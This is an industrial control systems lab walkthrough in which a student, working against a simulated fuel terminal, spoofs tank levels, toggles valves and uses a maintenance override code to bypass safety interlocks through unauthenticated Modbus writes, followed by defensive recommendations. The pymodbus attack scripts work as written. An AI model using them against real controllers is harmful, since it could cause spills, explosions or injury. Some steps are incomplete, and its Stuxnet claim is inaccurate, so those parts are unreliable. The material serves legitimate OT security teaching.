    Exercise ICS-2.1: Writing to the Wire

    Engagement Status

    Client Hex Point Energy Solutions
    Role Security Intern: OT Network Assessment
    Phase Discovery Enumeration Exploitation Reporting

    What you know so far: You have mapped the Hex Point Bay Terminal network, identified Modbus services on the tank simulator, and read holding registers to pull live process values. The operations manager reported anomalous readings on tank gauges and suspects compromise. It is time to determine whether an attacker could write values to the process, and what happens when they do.

    Objective

    In this exercise you will move from passive Modbus reads to active register and coil writes. You will manipulate tank levels, toggle valve coils, and discover a hidden maintenance override register that yields a flag. By the end you will understand exactly how an attacker with network access can alter a physical process through unauthenticated Modbus writes.

    Detail Value
    Difficulty Intermediate
    Estimated Time 45-60 minutes
    Prerequisites ICS-1.1 (Network Discovery), ICS-1.2 (Modbus Enumeration)

    Background: Modbus Write Function Codes

    In Level 1 you used Function Code 03 (Read Holding Registers) to pull process values off the wire. Modbus defines several write function codes that are equally simple, and equally unauthenticated:

    FC Name Purpose
    05 Write Single Coil Toggle a discrete output (valve, relay, motor starter) ON or OFF
    06 Write Single Register Set one 16-bit holding register to a new value
    15 Write Multiple Coils Toggle a block of discrete outputs in one request
    16 Write Multiple Registers Set a contiguous block of holding registers in one request

    Real-World Impact

    Unauthorized Modbus writes have caused real incidents. The most famous example is Stuxnet (2010), which wrote modified frequency values to Siemens S7-315 PLCs controlling uranium centrifuges at Natanz, causing them to spin outside safe parameters while reporting normal values to the operator HMI. In a petroleum terminal like Hex Point Bay, unauthorized writes could overflow a storage tank, open a valve during ship loading, or disable emergency shutdown logic.

    Why Writes Are Dangerous in OT

    In IT networks, writing bad data to a database is recoverable: you restore from backup. In OT, a bad write can cause:

    • Tank overflow: changing a level register fools the control logic into thinking a tank is empty when it is full
    • Valve failure: toggling a coil opens or closes a physical valve, potentially mixing incompatible products
    • Pipeline rupture: setting pressure beyond safe limits while suppressing alarms
    • Environmental disaster: fuel spills, gas leaks, or chemical releases

    Maintenance Override Registers

    Many PLCs and RTUs include special "maintenance" or "engineering" registers that unlock diagnostic modes or bypass safety interlocks. These registers are often documented only in vendor service manuals and rely on security by obscurity: the assumption that an attacker will not know the register address or the magic value to write. As you will see in this exercise, that assumption fails the moment an attacker finds the documentation.

    Walkthrough

    Step 1: Confirm Connectivity and Read Baseline Values

    Before writing anything, capture the current state of the process so you can observe changes. Connect to the tank simulator and read Tank 1 registers (holding 0-3).

    python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Read Tank 1: level%, temp°F, pressure PSI, flow BPH
result = client.read_holding_registers(0, 4, slave=1)
print("Tank 1 Baseline:")
print(f"  Level:    {result.registers[0]}%")
print(f"  Temp:     {result.registers[1]}°F")
print(f"  Pressure: {result.registers[2]} PSI")
print(f"  Flow:     {result.registers[3]} BPH")

client.close()
PYEOF

  Temp:     142°F
  Pressure: 14 PSI

    Step 2: Write a New Value to Tank 1 Level Register

    Use Function Code 06 (Write Single Register) to change Tank 1's reported level. You will write the value 9999 to register 0, simulating an attacker spoofing the level to 99.99%.

    python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Write 9999 to register 0 (Tank 1 level)
write_result = client.write_register(0, 9999, slave=1)
print(f"Write result: {write_result}")

# Read back to confirm the change
result = client.read_holding_registers(0, 4, slave=1)
print("\nTank 1 After Write:")
print(f"  Level:    {result.registers[0]}%")
print(f"  Temp:     {result.registers[1]}°F")
print(f"  Pressure: {result.registers[2]} PSI")
print(f"  Flow:     {result.registers[3]} BPH")

client.close()
PYEOF
    Expected Output 

    Write result: WriteRegisterResponse(0)

Tank 1 After Write:
  Level:    9999%
  Temp:     142°F
  Pressure: 14 PSI
  Flow:     850 BPH
    The level register now reads 9999: a value you set. The PLC accepted the write without any authentication challenge.

    No Authentication Required

    Notice that Modbus did not ask for a username, password, certificate, or any form of credential. The protocol has zero built-in authentication. If you can reach TCP port 502, you can write.

    Step 3: Toggle Valve Coils

    Coils represent discrete on/off outputs: typically valves, relays, or motor starters. The Hex Point Bay Terminal maps coils 0-8 to individual valves and coil 9 to the emergency shutdown (ESD) system. Use Function Code 05 (Write Single Coil) to open and close valves.

    python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Read current coil states (0-9)
coils = client.read_coils(0, 10, slave=1)
print("Current Coil States:")
labels = [
    "Valve 1 (Tank 1 inlet)", "Valve 2 (Tank 1 outlet)",
    "Valve 3 (Tank 2 inlet)", "Valve 4 (Tank 2 outlet)",
    "Valve 5 (Tank 3 inlet)", "Valve 6 (Tank 3 outlet)",
    "Valve 7 (Pipeline main)", "Valve 8 (Ship loading)",
    "Valve 9 (Emergency vent)", "ESD (Emergency Shutdown)"
]
for i, label in enumerate(labels):
    state = "OPEN" if coils.bits[i] else "CLOSED"
    print(f"  Coil {i}: {label} -- {state}")

# Toggle Valve 1 (coil 0) -- open it
print("\n--- Writing coil 0 = True (OPEN) ---")
client.write_coil(0, True, slave=1)

# Toggle Valve 2 (coil 1) -- close it
print("--- Writing coil 1 = False (CLOSED) ---")
client.write_coil(1, False, slave=1)

# Read back
coils = client.read_coils(0, 10, slave=1)
print("\nCoil States After Write:")
for i, label in enumerate(labels):
    state = "OPEN" if coils.bits[i] else "CLOSED"
    print(f"  Coil {i}: {label} -- {state}")

client.close()

    Physical Consequence

    You just opened Tank 1's inlet valve and closed its outlet valve. In a real terminal, this would allow product to flow into the tank with no way to drain: eventually causing an overflow. Unauthorized valve manipulation of this kind could result in an environmental spill or explosion.

    Step 5: Discover the Maintenance Override Register

    The operations manager mentioned that a service technician visited last month and used a "maintenance mode" to calibrate sensors. Check the documentation server for clues.

    curl -s http://docs.hexpoint.local:8888/emergency-procedures | grep -i -A5 "maintenance\|override\|register 50"
    Expected Output 
    MAINTENANCE OVERRIDE PROCEDURE (AUTHORIZED TECHNICIANS ONLY)
============================================================
To enter maintenance mode, write the service code to Holding Register 50.
The current service code is documented in the vendor binder (Section 7.4).
Override confirmation will be written to registers 51-54.

WARNING: Maintenance mode disables all safety interlocks.

    Security by Obscurity

    The documentation tells you the register address (50) and that a "service code" is required, but not the code itself. In a real engagement, you might find the code in a vendor manual PDF on a file share, in a technician's email, or through brute force. For this exercise, the code is 31337: a well-known "elite" number in hacker culture that terminal vendors have actually used as default service codes.

    Step 6: Trigger the Maintenance Override and Capture the Flag

    Write the value 31337 to holding register 50, then read registers 51-54 to retrieve the ASCII-encoded flag.

    python3 - <<'PYEOF'
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('sim.hexpoint.local', port=502)
client.connect()

# Write the maintenance override code
print("Writing 31337 to register 50 (maintenance override)...")
result = client.write_register(50, 31337, slave=1)
print(f"Write result: {result}")

# Read the override flag registers (51-54)
flag_regs = client.read_holding_registers(51, 4, slave=1)
print(f"\nRaw register values: {flag_regs.registers}")

# Decode ASCII -- each register holds two characters
flag = ''
for reg in flag_regs.registers:
    high_byte = (reg >> 8) & 0xFF
    low_byte = reg & 0xFF
    if high_byte > 0:
        flag += chr(high_byte)
    if low_byte > 0:
        flag += chr(low_byte)

print(f"Decoded flag: {flag}")

client.close()
PYEOF
    Expected Output 
    Writing 31337 to register 50 (maintenance override)...
Write result: WriteRegisterResponse(50)

Raw register values: [20291, 27953, 25458, ...]
Decoded flag: OCR{...find_me...}

    Flag Captured!

    Submit the decoded flag from registers 51-54 in the platform.

    You discovered and exploited a maintenance override register using an undocumented service code. In a real assessment, this would be a critical finding: an attacker with network access can disable safety interlocks with a single Modbus write.

    Analysis Questions

    1. What is the physical impact of unauthorized register manipulation on a petroleum terminal?

    Reveal Answer

    Manipulating tank level registers can fool the control system into overfilling or under-filling tanks, leading to spills, product mixing, or running pumps dry. Toggling valve coils can redirect product flow, open loading arms during ship departure, or disable emergency vents. Changing pressure setpoints on pipelines can cause ruptures. The consequences range from environmental contamination to explosions and loss of life.

    2. Why is "security by obscurity", hiding the maintenance register address and code, insufficient protection?

    Reveal Answer

    Obscurity fails because: (1) documentation leaks: vendor manuals end up on file shares, documentation servers, or the internet; (2) register addresses can be brute-forced by writing candidate values to every register and checking for responses; (3) the magic value (31337) is a well-known constant that appears in wordlists; (4) Wireshark captures of legitimate maintenance sessions reveal both the address and value. Defense must use authentication and authorization, not secrecy.

    3. How would you detect unauthorized Modbus writes in a production environment?

    Reveal Answer

    Deploy a Modbus-aware IDS (e.g., Snort with Modbus preprocessor, Claroty, Dragos) that inspects function codes and flags FC05/06/15/16 from unauthorized source IPs. Implement allowlisting so that only the engineering workstation can issue writes. Use a data historian to detect sudden value changes that deviate from physical process norms. Enable audit logging on the PLC if supported, and send logs to a SIEM for correlation.

    4. How does this attack differ from Stuxnet's approach?

    Reveal Answer

    Stuxnet was far more sophisticated: it compromised the engineering workstation, modified PLC ladder logic (not just data registers), and replayed recorded "normal" values to the HMI so operators saw nothing wrong. The exercise you just completed demonstrates a simpler direct-write attack that would be visible on the HMI. However, an attacker who combines register writes with HMI spoofing (writing false values to display registers) could achieve Stuxnet-like stealth without modifying PLC code.

    Defensive Recommendations

    Finding Risk Mitigation
    Unauthenticated Modbus writes accepted from any host Critical Deploy Modbus-aware firewall (e.g., Tofino, Fortinet OT) that allowlists source IPs for write function codes
    No network segmentation between IT and OT Critical Implement IEC 62443 zones and conduits with a DMZ between corporate and control networks
    Maintenance override accessible via network High Require physical key switch or local console access for maintenance mode: never allow remote override
    No anomaly detection on register values High Deploy OT monitoring (Dragos, Claroty, Nozomi) to baseline normal register ranges and alert on deviations
    Safety interlocks bypassable via software Critical Use hardwired safety instrumented systems (SIS) that cannot be overridden by Modbus commands

    Key Takeaways

    • Modbus has no authentication: any host that can reach TCP/502 can read and write registers and coils without credentials
    • Write function codes (FC05, FC06, FC15, FC16) allow direct manipulation of physical process values, valve states, and safety systems
    • Maintenance override registers are a common pattern in industrial controllers and represent a high-value target for attackers
    • Security by obscurity fails when documentation leaks, traffic is captured, or register spaces are brute-forced
    • Defense in depth requires network segmentation, protocol-aware firewalls, anomaly detection, and hardwired safety systems that operate independently of the control network
    • Physical consequences distinguish OT attacks from IT attacks: unauthorized writes can cause equipment damage, environmental disasters, and loss of life
